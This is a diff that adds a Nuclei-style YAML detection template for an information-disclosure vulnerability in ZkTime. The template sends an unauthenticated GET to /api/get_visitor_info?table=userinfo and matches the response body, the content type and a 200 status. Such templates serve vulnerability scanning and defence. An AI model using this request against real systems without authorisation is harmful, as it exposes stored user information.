@@ -1,0 +1,26 @@
+id: ZkTime-get_visitor_info-Information-disclosure
+
+info:
+  name: ZkTime get_visitor_info 信息泄露漏洞
+  author: ZkTime
+  severity: medium
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        GET /api/get_visitor_info?table=userinfo HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '	-	-'
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+      - type: status
+        status: 
+          - 200
